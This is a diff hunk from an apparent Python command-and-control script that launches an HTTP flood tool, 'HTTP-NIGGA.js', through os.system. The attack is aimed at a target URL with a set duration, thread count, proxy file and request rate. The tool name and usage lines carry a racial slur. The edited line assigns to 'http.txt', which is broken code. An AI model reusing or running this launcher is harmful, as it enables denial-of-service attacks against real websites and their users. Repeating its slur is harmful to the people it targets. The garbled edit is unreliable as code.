@@ -637,9 +637,9 @@ def main():
                 target = cnc.split()[1]
                 time = cnc.split()[2]
                 thread = cnc.split()[3]
-                proxFile = cnc.split()[4]
+                http.txt = cnc.split()[4]
                 rps = cnc.split()[5]
-                os.system(f'node HTTP-NIGGA.js {target} {time} {thread} {proxyFile} {rps}')
+                os.system(f'node HTTP-NIGGA.js {target} {time} {thread} {http.txt} {rps}')
             except IndexError:
                 print('Usage: Nigga <target> <time> <threads> <proxyFile> <rps>')
                 print('Example: Nigga https://example.com 60 500 http.txt 500')
